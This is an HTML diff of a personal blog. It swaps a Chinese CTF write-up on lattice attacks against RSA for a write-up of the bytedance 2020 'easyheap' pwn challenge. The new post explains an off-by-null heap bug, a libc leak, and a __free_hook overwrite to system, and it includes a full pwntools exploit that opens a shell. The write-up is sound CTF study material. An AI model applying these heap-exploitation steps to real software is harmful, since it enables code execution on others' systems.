@@ -15,18 +15,19 @@
 
 
 
-<meta name="description" content="题目源码 1234567891011121314151617181920212223242526272829303132333435from Crypto.Util.number import *import gmpy2import randomfrom FLAG import flagdef genE(lcm,limit):    while True:        r &#x3D; random.ra">
+<meta name="description" content="第一次在正式比赛中做PWN题，虽然因为不熟悉一些利用技巧导致走了很多弯路，但在队友的帮助下做出来就很舒服。 经典菜单题，这也是我为什么会选择做这题的原因orz，没有edit。 漏洞点查看add函数 12345678910111213141516171819202122232425262728293031printf(&quot;Size: &quot;);__isoc99_scanf(&quot;%hd&quot;, &amp;v1);">
 <meta property="og:type" content="article">
-<meta property="og:title" content="De1CTF[2020]-easyRSA">
-<meta property="og:url" content="https://zrax-x.github.io/2020/05/11/De1CTF[2020]-easyRSA/index.html">
+<meta property="og:title" content="bytedance 2020 easyheap">
+<meta property="og:url" content="https://zrax-x.github.io/2020/10/26/bytedance_2020_easyheap/index.html">
 <meta property="og:site_name" content="从零开始的博客">
-<meta property="og:description" content="题目源码 1234567891011121314151617181920212223242526272829303132333435from Crypto.Util.number import *import gmpy2import randomfrom FLAG import flagdef genE(lcm,limit):    while True:        r &#x3D; random.ra">
-<meta property="article:published_time" content="2020-05-11T07:00:00.000Z">
-<meta property="article:modified_time" content="2020-05-13T08:00:28.303Z">
+<meta property="og:description" content="第一次在正式比赛中做PWN题，虽然因为不熟悉一些利用技巧导致走了很多弯路，但在队友的帮助下做出来就很舒服。 经典菜单题，这也是我为什么会选择做这题的原因orz，没有edit。 漏洞点查看add函数 12345678910111213141516171819202122232425262728293031printf(&quot;Size: &quot;);__isoc99_scanf(&quot;%hd&quot;, &amp;v1);">
+<meta property="article:published_time" content="2020-10-26T07:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-26T07:21:07.657Z">
 <meta property="article:author" content="zraxx">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="密码学">
-<meta property="article:tag" content="RSA">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Off-by-null">
+<meta property="article:tag" content="Tcache bin">
+<meta property="article:tag" content="Unsorted bin">
 <meta name="twitter:card" content="summary">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
@@ -61,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>De1CTF[2020]-easyRSA | 从零开始的博客</title>
+<title>bytedance 2020 easyheap | 从零开始的博客</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -246,11 +247,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-De1CTF[2020]-easyRSA" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-bytedance_2020_easyheap" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/05/11/De1CTF%5B2020%5D-easyRSA/" class="article-date">
-      <time datetime="2020-05-11T07:00:00.000Z" itemprop="datePublished">2020-05-11</time>
+      <a href="/2020/10/26/bytedance_2020_easyheap/" class="article-date">
+      <time datetime="2020-10-26T07:00:00.000Z" itemprop="datePublished">2020-10-26</time>
 </a>
 
 
@@ -265,7 +266,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      De1CTF[2020]-easyRSA
+      bytedance 2020 easyheap
     </h1>
   
 
@@ -276,7 +277,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RSA/" rel="tag">RSA</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Off-by-null/" rel="tag">Off-by-null</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Tcache-bin/" rel="tag">Tcache bin</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Unsorted-bin/" rel="tag">Unsorted bin</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -286,20 +287,15 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>题目源码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genE</span><span class="params">(lcm,limit)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = random.randint(limit,limit*<span class="number">0x1000000000001</span>)</span><br><span class="line">        d = gmpy2.next_prime(r)</span><br><span class="line">        e = gmpy2.invert(d,lcm)</span><br><span class="line">        <span class="keyword">if</span> isPrime(e):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">lcm = gmpy2.lcm(p<span class="number">-1</span>,q<span class="number">-1</span>)</span><br><span class="line">limit = gmpy2.iroot(n,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">e1 = genE(lcm,limit)</span><br><span class="line">e2 = genE(lcm,limit)</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d1 = gmpy2.invert(e1,phi)</span><br><span class="line">d2 = gmpy2.invert(e2,phi)</span><br><span class="line"></span><br><span class="line">e = [e1,e2]</span><br><span class="line">plain = bytes_to_long(flag)</span><br><span class="line">cipher = pow(plain,e[random.getrandbits(<span class="number">1</span>)],n)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'N:'</span> + str(n))</span><br><span class="line">print(<span class="string">'e1:'</span> + str(e1))</span><br><span class="line">print(<span class="string">'e2:'</span> + str(e2))</span><br><span class="line">print(<span class="string">'cipher:'</span> + str(cipher))</span><br></pre></td></tr></table></figure>
-<p>用n计算了两对e，d，其中d都比较小</p>
-<p>这里需要参考这篇论文<a href="https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf" target="_blank" rel="noopener">https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf</a> </p>
-<p>论文的结论就是给出多对e,d，其中$d&lt;N^α$，就可以分解N</p>
-<p>这里当给出2对e，d时需要满足$d&lt;N^{5/14}$，观察题目就可以发现满足该不等式。</p>
-<p>因此我们构造矩阵</p>
-<p>$B = \begin{bmatrix}1 &amp; -N &amp; 0 &amp; N^2 \\  &amp; e_1 &amp; - e_1 &amp; -e_1N\\ &amp; &amp; e_2 &amp; -e_2N \\ &amp; &amp; &amp; e_1e_2\end{bmatrix}$</p>
-<p>$D = \begin{bmatrix}N &amp;  &amp;  &amp;  \\  &amp;  N^{(1/2)} &amp; &amp; \\ &amp; &amp; N^{1+\delta_2} &amp;  \\ &amp; &amp; &amp; 1\end{bmatrix}$</p>
-<p>$L=B*D$</p>
-<p>同时需要求解的向量$v = (k_1k_2,k_2(g-k_1s),g(k_1-k_2),(g-k_1s)(g-k_2s))$</p>
-<p>之后对$L$求$LLL$，记为$L_2$</p>
-<p>于是$v = L_2[0]*L^{-1}$</p>
-<p>之后便可得到$\Phi(N)=e_1*v[1]/v[0]​$，进而求得明文</p>
+        <p>第一次在正式比赛中做PWN题，虽然因为不熟悉一些利用技巧导致走了很多弯路，但在队友的帮助下做出来就很舒服。</p>
+<p>经典菜单题，这也是我为什么会选择做这题的原因orz，没有edit。</p>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>查看add函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);</span><br><span class="line">v2 = v1;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">128</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid size."</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>, &amp;v1);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 &lt;= <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 &gt; <span class="number">128</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = v1;</span><br><span class="line">&#125;</span><br><span class="line">s = <span class="built_in">malloc</span>(v1);</span><br><span class="line"><span class="keyword">if</span> ( !s )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Malloc error."</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, v1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Content: "</span>, <span class="number">0L</span>L);</span><br><span class="line">sub_12CC((__int64)s, v1);</span><br><span class="line">*((_BYTE *)s + v2 - <span class="number">1</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>注意这里第三行在输入v1后会立即对v2赋值，但是假如v1不在[1,128]之间就会提示重新输入v1，但是显然程序后续没有更新v2的值，这导致在最后一行对s赋值的时候，v2!=v1，造成off-by-null。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>我们尝试申请到一个块的低位地址为00，同时将其free到unsorted bin里面（题目中有8个块，因此可以做到）然后利用off-by-null我们可以伪造另一个块的fd指向unsorted bin中块，然后连续申请块，利用show功能获取libc地址信息。至此我们完成了对libc的泄露。但这里我们观察到程序中有个memset(s, 0, v1);因此我们在申请块的时候可以输入使v1=1，这样只会清空unsorted bin中的块的最低位的一个字节，而这个字节是固定的，可以通过调试获取到。</p>
+<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>获取到libc基址后我们就可以获取到system函数地址以及__free_hook地址。然后再次尝试申请到一个块的低位为00，通过off-by-null伪造这个块的fd指向本身，这样我们首先申请到这个块，然后将其fd改为__free_hook后，再次申请，这次我们把内容改写为system的地址。然后随便free一个块就能拿到shell。</p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_with_overflow</span><span class="params">(size, fake_size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(fake_size))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'aaaaaaaaaaa'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> [<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]:</span><br><span class="line">        free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add_with_overflow(<span class="number">0x80</span>, <span class="number">0x1b1</span>, <span class="string">"bbbbbbbbbb"</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'cccccc'</span>)</span><br><span class="line">add_with_overflow(<span class="number">0x1</span>, <span class="number">0x111</span>, <span class="string">'\xe0'</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x1ebce0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>, hex(libc_base)</span><br><span class="line">free_hook = libc_base + <span class="number">0x1eeb28</span></span><br><span class="line">system_addr = libc.sym[<span class="string">'system'</span>] + libc_base</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_hook:"</span>, hex(free_hook)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr:"</span>, hex(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'xxxxxxxxxxxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add_with_overflow(<span class="number">0x60</span>, <span class="number">0x1e1</span>, <span class="string">'aaaaa'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x60</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x60</span>, p64(system_addr))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -308,13 +304,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/05/11/De1CTF%5B2020%5D-easyRSA/">De1CTF[2020]-easyRSA</a></p>
+        <p><span>本文标题:</span><a href="/2020/10/26/bytedance_2020_easyheap/">bytedance 2020 easyheap</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">zraxx</a></p>
-        <p><span>发布时间:</span>2020-05-11, 00:00:00</p>
-        <p><span>最后更新:</span>2020-05-13, 01:00:28</p>
+        <p><span>发布时间:</span>2020-10-26, 00:00:00</p>
+        <p><span>最后更新:</span>2020-10-26, 00:21:07</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/05/11/De1CTF%5B2020%5D-easyRSA/" title="De1CTF[2020]-easyRSA">https://zrax-x.github.io/2020/05/11/De1CTF[2020]-easyRSA/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://zrax-x.github.io/2020/05/11/De1CTF[2020]-easyRSA/　　作者: zraxx" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/10/26/bytedance_2020_easyheap/" title="bytedance 2020 easyheap">https://zrax-x.github.io/2020/10/26/bytedance_2020_easyheap/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://zrax-x.github.io/2020/10/26/bytedance_2020_easyheap/　　作者: zraxx" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -326,16 +322,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/">
-                    De1CTF[2020]-NLFSR
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/05/11/De1CTF%5B2020%5D-ECDH/">
-                    De1CTF[2020]-ECDH
+                <a href="/2020/10/23/pwnable_dubblesort/">
+                    pwnable.tw dubblesort
                 </a>
             </div>
         
@@ -347,7 +337,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞点"><span class="toc-number">1.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一步"><span class="toc-number">2.1.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二步"><span class="toc-number">2.2.</span> <span class="toc-text">第二步</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -383,7 +373,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"De1CTF[2020]-easyRSA　| 从零开始的博客　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"bytedance 2020 easyheap　| 从零开始的博客　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -405,15 +395,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/" title="上一篇: De1CTF[2020]-NLFSR">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/05/11/De1CTF%5B2020%5D-ECDH/" title="下一篇: De1CTF[2020]-ECDH">
+            <a href="/2020/10/23/pwnable_dubblesort/" title="下一篇: pwnable.tw dubblesort">
                 <i class="fa fa-angle-right"></i>
             </a>
         
